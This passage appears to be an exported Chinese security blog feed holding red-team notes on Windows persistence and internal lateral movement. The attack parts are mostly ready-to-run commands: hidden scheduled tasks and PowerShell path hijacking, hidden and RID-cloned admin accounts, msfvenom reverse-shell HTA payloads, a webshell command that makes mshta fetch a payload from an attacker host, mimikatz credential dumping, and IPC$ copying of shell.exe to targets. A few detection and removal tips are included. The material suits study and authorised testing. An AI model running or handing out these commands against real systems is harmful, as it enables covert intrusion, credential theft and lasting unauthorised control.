/Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00 /ET 14:00 /K</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务“EventLog”以开始运行 wevtvwr.msc只要在“系统”通道中发布事件 101</span></span><br><span class="line"><span class="string">SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT /EC System /MO *[System/EventID=101]</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">==&gt; 文件路径中可以加入空格，但需要加上两组引号，一组引号用于 CMD.EXE，另一组用于 SchTasks.exe。用于 CMD的外部引号必须是一对双引号；内部引号可以是一对单引号或一对转义双引号:</span></span><br><span class="line"><span class="string">SCHTASKS /Create /tr &quot;&#x27;</span>c:\program files\internet explorer\iexplorer.exe<span class="string">&#x27; \&quot;c:\log data\today.xml\&quot;&quot; ...</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209021206058.png" alt="image-20220902120649773"></p><h4 id="输入taskschd-msc查看计划任务"><a href="#输入taskschd-msc查看计划任务" class="headerlink" title="输入taskschd.msc查看计划任务"></a>输入taskschd.msc查看计划任务</h4><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022159661.png" alt="image-20220902215958413" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022209833.png" alt="image-20220902220949582" style="zoom: 33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210135.png" alt="image-20220902221014958" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210895.png" alt="image-20220902221042649" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210792.png" alt="image-20220902221059540" style="zoom:50%;" /><h2 id="Task-Powershell"><a href="#Task-Powershell" class="headerlink" title="Task-Powershell"></a>Task-Powershell</h2><blockquote><p><a href="https://github.com/re4lity/Schtasks-Backdoor">https://github.com/re4lity/Schtasks-Backdoor</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211346068.png" alt="image-20220821134634881"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211346981.png" alt="image-20220821134647829"></p><h2 id="较新的权限维持方法"><a href="#较新的权限维持方法" class="headerlink" title="较新的权限维持方法"></a>较新的权限维持方法</h2><blockquote><p>算一个漏洞，新的机器大概率会修复，不过很多机器不一定修复</p><p>参考：<a href="https://mp.weixin.qq.com/s/Tt6REDrPH-WWgMB-mIOnTA">计划任务启动PowerShell.exe实现持久化</a></p></blockquote><h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3><p>利用PowerShell启动时执行Get-Variable执行恶意文件<br>1.将恶意程序放在<code>%APPDATA%Local\Microsoft\WindowsApps</code>目录下并重命名为<code>Get-Variable.exe</code><br>2.创建计划任务实现持久化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks.exe /create /tn COMSurrogate /st 00:00 /du 9999:59 /sc once /ri 1 /f tr &quot;powershell.exe -windowstyle hidden&quot;</span><br><span class="line"></span><br><span class="line">#powershell.exe -windowstyle hidden 中-windowstyle设置powershell.exe的窗口风格~~隐藏</span><br></pre></td></tr></table></figure><p>该命令创建计划任务程序COMSurrogate,该程序以隐藏的方式执行PowerShell。而执行PowerShe1l会启动恶意程序Get-Variable.exe,从而实现持久化。</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>在执行powershell的时候，powershell会做一个类似在机器目录中查找环境变量的操作，会找到<code>%APPDATA%Local\Microsoft\WindowsApps</code>目录下面，如果看到该目录下面有个Get-variable.exe会默认执行~~。我们只需要将该目录下的Get-variable.exe替换为后门即可~</p><p>总结来说便是：<strong>通过运行PowerShell时触发执行Get-variable来实现攻击</strong></p><h3 id="具体原理细节："><a href="#具体原理细节：" class="headerlink" title="具体原理细节："></a>具体原理细节：</h3><p>执行PowerShell ，在Process monitor观察PowerShell 对Get-variable.exe的操作可知：</p><p>首先，PowerShell 遍历系统环境变量路径下是否存在：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058264.png" alt="图片"></p><p>然后遍历在用户环境变量路径下是否存在：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058150.png" alt="图片"></p><p>其中用户环境变量包括路径%APPDATA%\Local\Microsoft\WindowsApps：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260058250.png" alt="图片"></p><p>当发现该文件时，调用该文件并使用参数Name host ValueOnly 执行:<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260059983.png" alt="图片"></p><p>该<code>Get-Variable host -ValueOnly</code>命令用于在Windows上获取主机操作系统信息，如下：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260059929.png" alt="图片"></p><p>PowerShell在启动时会尝试执行该命令获取控制台主机信息,根据控制台主机信息的配置去启动PowerShell，如中英文设置、UI设置。</p><p>因此，我们可以发现：该机制类似dll劫持，PowerShell按顺序在系统和用户的环境变量中搜索Get-variable并执行，所以将恶意文件重命名为Get-variable.exe并放置在PowerShell的搜索路径中，就可以在启动PowerShell时执行恶意文件。</p><p>而使用路径%APPDATA%\Local\Microsoft\WindowsApps的原因是：<strong>在Win10上默认的用户环境变量中存在该路径，且将文件复制进该文件夹不需要特殊权限，具有普遍性,容易利用。</strong></p><p>经过测试发现，仅有该cmdlet放置在WindowsApps下时可以触发执行。</p><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><blockquote><p><a href="https://paper.seebug.org/1464/#_8">windows 计划任务隐藏新姿势分享</a></p></blockquote><h1 id="快捷方式劫持"><a href="#快捷方式劫持" class="headerlink" title="快捷方式劫持"></a>快捷方式劫持</h1><p>Windows快捷方式包含对系统上安装的软件或文件位置(网络或本地)的引用。快捷方式的文件扩展名是.LNK，它为红队提供了很多机会来执行各种格式的代码 exe、vbs、Powershell、scriptlet  等。invoke-item在powershell中就是指唤醒程序</p><p><strong>在执行快捷方式的时候 无感唤醒后门~~</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c &quot;invoke-item &#x27;C:\Windows\system32\cmd.exe&#x27;; invoke-item C:\Users\Administrator\DeSsktop\msf_6666_win64.exe&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208260933022.png" alt="image-20220826093326825" style="zoom: 50%;" /><h1 id="账户隐藏"><a href="#账户隐藏" class="headerlink" title="账户隐藏"></a>账户隐藏</h1><blockquote><ul><li><p>后门可能被杀软查杀，隐藏账户就很直接</p></li><li><p>lusrmgr.msc查看管理员组下有无新成员</p></li><li><p>命令行：</p></li></ul><blockquote><ul><li>wmic useraccount</li><li>net user</li><li>net localgroup administrators</li></ul></blockquote><ul><li>D盾_web查杀工具可以检查隐藏账号、克隆账号</li></ul></blockquote><ul><li>隐藏用户</li></ul><p>通过 net user  命令查看不到，但是在控制面板的管理账户界面可以查看到。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#添加账户</span><br><span class="line">net user 用户名 密码 /add</span><br><span class="line">#组中添加用户</span><br><span class="line">net localgroup 组 用户名 /add</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ AdminPass /add &amp;&amp; net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure><ul><li>激活Guest用户</li></ul><blockquote><p>&#x2F;active:no表示禁用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user guest Admin@hacker &amp;&amp; net localgroup administrators guest /add</span><br><span class="line">net user guest /active:yes</span><br></pre></td></tr></table></figure><h1 id="RID劫持-隐蔽性好-克隆账户"><a href="#RID劫持-隐蔽性好-克隆账户" class="headerlink" title="RID劫持 (隐蔽性好)(克隆账户)"></a>RID劫持 (隐蔽性好)(克隆账户)</h1><blockquote><p>参考：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F">渗透技巧-Windows系统的帐户隐藏</a></p></blockquote><p>写入注册表，创建克隆 administrator  账号，且通过命令 net user  以及<strong>控制面板中的管理账户</strong>无法看到。注意！！！控制面板中的管理账户也无法看到！！！！</p><h2 id="隐藏步骤"><a href="#隐藏步骤" class="headerlink" title="隐藏步骤"></a>隐藏步骤</h2><ol><li>用’$’创建匿名用户，并归到administrators和remote desktop users用户组（归入对应组就拥有了管理员和远程桌面的权限）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ AdminPass /add /y</span><br><span class="line">net localgroup administrators admin$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; admin$ /add</span><br></pre></td></tr></table></figure><ol start="2"><li>对注册表赋予权限</li></ol><p>默认注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>只有system权限才能修改。因此需要给 Administrator  用户赋予 Sam  键值权限，默认是不允许的。现在需要为其添加管理员权限~~</p><p>右键-权限-选中Administrators，允许完全控制。如下图</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261531600.png" alt="Alt text" style="zoom:50%;" /><p>重新启动注册表regedit.exe，获得对该键值的修改权限。</p><ol start="3"><li>导出注册表</li></ol><p>在注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户admin$。获取默认类型为<code>0x3ea</code>,将注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\admin$导出为<strong>1.reg</strong></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261534789.png" alt="Alt text" style="zoom:50%;" /><p>在注册表下能够找到对应类型名称的注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>。右键将该键导出为<code>2.reg</code>。如下图</p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-10/2-5.png" alt="Alt text" style="zoom:50%;" /><p>默认情况下，管理员帐户Administrator对应的注册表键值为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>。同样，右键将该键导出为<code>3.reg</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261606001.png" alt="image-20220826160641524" style="zoom:50%;" /><ol start="4"><li>将 administrator  用户对应的 Users  中的F值复制替换后门账户的F值</li></ol><blockquote><p>注册表中的F值类似权限的意思，授予了相应的F值即具备对应权限</p></blockquote><p>将注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>下键F的值替换为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>下键F的值，即2.reg中键F的值替换成3.reg中键F的值</p><ol start="5"><li>通过命令删除刚才的后门用户</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ /del</span><br></pre></td></tr></table></figure><ol start="6"><li>通过注册表导入刚才导出的两个注册表文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regedit /s 1.reg</span><br><span class="line">regedit /s 2.reg</span><br></pre></td></tr></table></figure><p>用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。</p><p><strong>&#x3D;&#x3D;net user 或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。&#x3D;&#x3D;</strong></p><p>隐藏账户制做完成，控制面板不存在帐户test$</p><p>通过net user无法列出该帐户</p><p>计算机管理-本地用户和组-用户也无法列出该帐户</p><p>但可通过如下方式查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$</span><br></pre></td></tr></table></figure><p>无法通过<code>net user admin$ /del</code>删除该用户，提示用户不属于此组，如下图</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261544986.png" alt="Alt text"></p><h2 id="删除方法："><a href="#删除方法：" class="headerlink" title="删除方法："></a><strong>删除方法：</strong></h2><p>删除注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>下对应帐户的键值(共有两处)</p><p><strong>注：</strong>工具HideAdmin能自动实现以上的创建和删除操</p><h2 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h2><ul><li>针对隐藏帐户的利用，查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>即可</li></ul><blockquote><p> 当然，默认管理员权限无法查看，需要**&#x3D;&#x3D;分配权限或是提升至Sytem权限&#x3D;&#x3D;**</p></blockquote><ul><li>隐藏帐户的登录记录，可通过查看日志获取</li></ul><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><h3 id="复制管理员帐户Administrator"><a href="#复制管理员帐户Administrator" class="headerlink" title="复制管理员帐户Administrator"></a>复制管理员帐户Administrator</h3><p>需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态</p><h3 id="复制已有帐户"><a href="#复制已有帐户" class="headerlink" title="复制已有帐户"></a>复制已有帐户</h3><p>在3389远程登录的利用上存在相同帐户的冲突关系。通过cmd开启本机的3389远程登录功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure><p>利用以上方法，克隆帐户a的权限，建立隐藏帐户aaa$。如果系统当前登录帐号为a，那么使用隐藏帐户aaa$登录的话，会系统被识别为帐户a，导致帐户a下线</p><h3 id="新建帐户再复制"><a href="#新建帐户再复制" class="headerlink" title="新建帐户再复制"></a>新建帐户再复制</h3><p>进一步，大胆的思考。新建管理员帐户b，克隆帐户b，建立隐藏账户bbb$。删除管理员帐户b，隐藏账户bbb$仍然有效</p><h3 id="原帐户的维持"><a href="#原帐户的维持" class="headerlink" title="原帐户的维持"></a>原帐户的维持</h3><p>再进一步。克隆帐户a的权限，建立隐藏帐户aaa$。修改帐户a的密码，隐藏帐户aaa$仍然有效</p><h1 id="启动项-文件夹启动"><a href="#启动项-文件夹启动" class="headerlink" title="启动项-文件夹启动"></a>启动项-文件夹启动</h1><blockquote><p>很容易被发现</p></blockquote><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在每次开机或重启的时候就会运行启动文件夹下的程序（把快捷方式丢进来就好啦），和前面开机自启注册表项很类似。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#用户启动项目录路径位置</span><br><span class="line">C:\Users\&#123;UserName&#125;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">#系统启动目录</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p></li><li><p>单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p></li><li><p>单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p></li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce </span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p></blockquote><ul><li>利用安全软件查看启动项、开机时间管理等。</li><li>组策略，运行gpedit.msc。</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261631491.png" alt="image-20220826163144164" style="zoom: 33%;" /></blockquote><ul><li>wmic startup list 检查启动项</li></ul><h1 id="服务后门"><a href="#服务后门" class="headerlink" title="服务后门"></a>服务后门</h1><blockquote><p>用sc创建一个test服务，执行我们上传的木马。实用性不是很强</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create test binPath= BinaryPathName</span><br></pre></td></tr></table></figure><p>重启权限维持，但一般杀软会拦截。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC2%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">Windows权限维持–后门篇</a></p><p><a href="https://cloud.tencent.com/developer/article/1850726">干货 | 最全Windows权限维持总结</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x28 - 内网横向移动</title>
      <link href="/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x28-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动简介"><a href="#横向移动简介" class="headerlink" title="横向移动简介"></a>横向移动简介</h1><p>当攻击者在拿下一台内网主机后，通常会利用当前拿下的机器当作跳板，进一步攻击内网其他主机，扩大攻击影响范围。</p><p>工作组内横向移动和在外网渗透很相似</p><p>域内横向移动的话就需要寻找到域内的相应用户、域控， 最直接的拿到权限方法就是获取哈希或者用户凭证，最直接拿到域控权限的方法，再就是得到了域内一个主机的账户密码就可以尝试对域内其他的主机账户尝试登录。只要在你的机器上登录过域控，就有可能从你的机器中拿到域控的凭证登录域控。再或者就是内网弱口令也很多，这种弱口令一拿就是一大批，扩大攻击范围。</p><p>我们内网渗透过程中，首先使用Windows内置的工具，如果不满足需求就再上传外部工具进行渗透</p><h1 id="获得权限"><a href="#获得权限" class="headerlink" title="获得权限"></a>获得权限</h1><p>也就是拿到一台进入内网的入口,信息收集发现weblogic资产</p><ul><li>扫描：</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112055209.png" alt="image-20220811205540863" style="zoom: 33%;" /><ul><li>利用weblogic历史漏洞：利用脚本写入webshell</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112057659.png" alt="image-20220811205716568" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208112058391.png" alt="image-20220811205828304" style="zoom:50%;" /><ul><li>利用小马传大马：MSF生成HTA反弹shell</li></ul><p>传hta弹shell，可以远程下载hta，无文件落地上线msf（优点）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=4002 -f hta-psh -o 4002.hta</span><br><span class="line"></span><br><span class="line">-f hta-psh以hta格式输出</span><br><span class="line"></span><br><span class="line">并开启msf监听：</span><br></pre></td></tr></table></figure><ul><li>通过WEB漏洞反弹shell</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（内置）mshta远程下载hta文件执行</span><br><span class="line">并在vps开启一个web服务供下载hta文件（python3 -m http.server）</span><br><span class="line">http://1xx.xx.xx.95:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=cmd /c mshta http://1xx.xx.xx.91:8000/6666.hta</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd /c mshta http://1xx.xx.xx.91:8000/6666.hta</span><br><span class="line">以非交互式方式执行命令</span><br></pre></td></tr></table></figure><ul><li><p>得到MSF会话，在meterpreter中，可以通过run命令记载Post\后渗透模块进行使用。</p></li><li><p>获取账号密码</p></li></ul><p><strong>mimikatz能从lsass.exe文件中读取密码，因为只要某个用户登录过，其密码就会记录在lsass.exe进程中，只要其没有重启或者关机，密码都会记录在lsass.exe进程之中</strong></p><p><strong>这种记录密码的特性为我们域内渗透提供了一种新的思路：</strong></p><p><strong>如果域提权不了，拿不到域控，我们便可以通过下面获取账号密码的方式可以获取其他用户的账户和密码</strong></p><p><strong>那么我们就可以从获取的其他用户账户密码入手继续登录其他主机，再在其机器上查找有无域控账户的登录痕迹，如果域控登陆过这台机器，就会有域控的账户密码，籍此方法间接获取域控的权限</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051846777.png" alt="image-20220805184648622" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在msf中有集成mimikatz的模块</span><br><span class="line">load kiwi加载内置的mimikatz</span><br><span class="line">加载完模块后，可以通过help查看加载的模块的用法</span><br><span class="line">getsystem先提升权限，获取system权限</span><br><span class="line">creds_all获取所有凭证</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web\administrator   1qaz@WSX</span><br></pre></td></tr></table></figure><ul><li>登录验证（验证拿到的账号密码能否进行登录）</li></ul><p>通过了两个工具，一个是crackmapexec，一个是smbclient</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec：对目标主机smb协议以及默认文件共享进行一枚举，通过我们提供的账户密码获取其文件共享</span><br><span class="line">crackmapexec smb 192.168.10.112 -u &#x27;WEB\administrator&#x27; -p &#x27;1qaz@WSX&#x27; --shares</span><br><span class="line">用GUNGNIR域控管理员的账户密码：</span><br><span class="line">crackmapexec smb 192.168.10.112 -u &#x27;administrator&#x27; -p &#x27;1qaz@WSX3&#x27; --shares</span><br><span class="line"></span><br><span class="line">smbclient：利用账户密码，提供smb服务登录到其系统，就相当于拿到了一个命令行终端</span><br><span class="line">smbclient //192.168.10.112/C$ -U &#x27;WEB\administrator%1qaz@WSX&#x27;</span><br><span class="line">输入help即可查看可以使用的命令</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208120911337.png" alt="image-20220812091111949"></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051847741.png" alt="image-20220805184747362" style="zoom:50%;" /><h2 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h2><blockquote><ul><li>cs中meterpreter中的shell的本质，就是在目标主机起一个cmd.exe</li><li>H:\ATTACK\权限提升\SysinternalsSuite目录中有Sysinternal工具</li></ul><p>Sysinternal是微软官方开发的一些工具套件，可以使用这些工具去分析系统的一些进程啊什么的</p><p>可以使用文件夹中的procexp64.exe来分析进程</p></blockquote><ul><li>内网主机存活探测(尝试找出域控ip)</li></ul><p>如何寻找域控呢？</p><ol><li>下面工具的功能，类似内网<code>arp -a</code>查看各个网段有哪些IP主机存活,并尝试判断域控是哪个</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208121520690.png" alt="image-20220812152048429" style="zoom: 50%;" /><ol start="2"><li><code>ipconfig -all</code>查找本机的DNS服务器，一般是域控在提供DNS解析</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130005835.png" alt="image-20220813000513503" style="zoom:50%;" /><p>3.直接ping 域名，如<code>ping gungnir.top</code></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208130006771.png" alt="image-20220813000617610" style="zoom:50%;" /><ol start="4"><li>扫描发现：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbscan.exe -m 10.10.10.0/24</span><br><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051848699.png" alt="image-20220805184808384" style="zoom: 33%;" /><h1 id="横向移动-内置工具篇"><a href="#横向移动-内置工具篇" class="headerlink" title="横向移动-内置工具篇"></a>横向移动-内置工具篇</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><h3 id="IPC-简介"><a href="#IPC-简介" class="headerlink" title="IPC$  简介"></a>IPC$  简介</h3><p>IPC$  (Internet Process Connection) 是<strong>共享”命名管道”<strong>的资源，它是为了</strong>让进程间通信而开放的命名管道</strong>，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。当然也可以关闭<br>利用 IPC$ ，连接者与目标主机利用建立的连接可以得到目标主机上的<strong>目录结构、用户列表</strong>等信息。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>开放了 139 、 445 端口；</li></ul><p>IPC$  连接可以实现<strong>远程登陆及对默认共享</strong>的访问，而 <strong>139 端口的开启表示 netbios</strong>  协议的应用。445是smb服务<br>我们可以通过 139 和 445 端口来实现对共享文件&#x2F;打印机的访问，因此一般来讲， IPC$ 连接是需要 139或 445 端口来支持的。<br>IPC$  连接默认会走 445 端口，不通的话则会走 139 端口，这两个端口都可以单独实现文件共享</p><p>一般Windows会有默认共享，也就是意味着会开发这些端口</p><ul><li>目标开启 IPC$  <strong>文件共享服务</strong>及<strong>默认共享</strong></li></ul><p>默认共享是<strong>为了方便管理员远程管理</strong>而默认开启的共享。<br>所有逻辑磁盘（ c$、d$、e$ …）和系统目录 WINNT  或 WINDOWS（ADMIN$） ，通过IPC连接可以实现对这些默认共享的访问。具备管理员权限即可去实现相应的功能</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051850244.png" alt="image-20220805185059115" style="zoom:50%;" /><ul><li>需要目标机器的<strong>管理员账号和密码</strong></li></ul><p>域内：默认情况下只有被添加到远程计算机<strong>管理员组的域用户（域管用户）</strong>有权限对 <strong>admin$</strong>  目录建立 IPC  连接</p><p>工作组内：<strong>本地的 Administrator  用户</strong>也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用 Administrator  用户远程连接</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>这些命令不要死记硬背，只要我们本地用什么命令，如何加上个<code>\\10.10.10.10\</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 连接</span><br><span class="line">net use \\10.10.10.10\ipc$ /user:PC\administrator &quot;1qaz@WSX3e&quot;</span><br><span class="line">net use \\10.10.10.10\ipc$ /user:GUNGNIR\administrator &quot;1qaz@WSX3&quot;</span><br><span class="line">2. 查看连接情况</span><br><span class="line">net use</span><br><span class="line">3. 查看目标主机时间</span><br><span class="line">net time \\10.10.10.10</span><br><span class="line">net  time 默认查看本机时间</span><br><span class="line">4. 查看C盘文件</span><br><span class="line">dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051854255.png" alt="image-20220805185438016" style="zoom: 50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4. 删除连接</span><br><span class="line">net use \\10.10.10.201\ipc$ /del </span><br><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208051855893.png" alt="image-20220805185501722" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5. 文件上传下载</span><br><span class="line">copy shell.exe \\10.10.10.201\c$\windows\temp\plugin_update.exe   </span><br><span class="line">copy \\10.10.10.201 \c$\59.exe c:\</span><br><span class="line">6. 查看目标主机文件</span><br><span class="line">dir \\10.10.10.201\c$</span><br><span class="line">7. 开放/关闭 ipc$ 共享。</span><br><span class="line">net share ipc$</span><br><span class="line">net share ipc$ /del</span><br><span class="line">8. 共享计算机 C 盘。</span><br><span class="line">net share C=c:\</span><br><span class="line">9. 映射共享磁盘到本地。将目标的C盘挂载到本地的z盘下（原本没有z盘）</span><br><span class="line">net use z: \\10.10.10.10\c$ </span><br><span class="line">10. 查看/删除共享的资源。</span><br><span class="line">net share</span><br><span class="line">net share C /del</span><br><span class="line">11. 取消IPC远程连接。</span><br><span class="line">net use c: /del</span><br><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure><p>挂在目标机器的磁盘效果图：</p><img 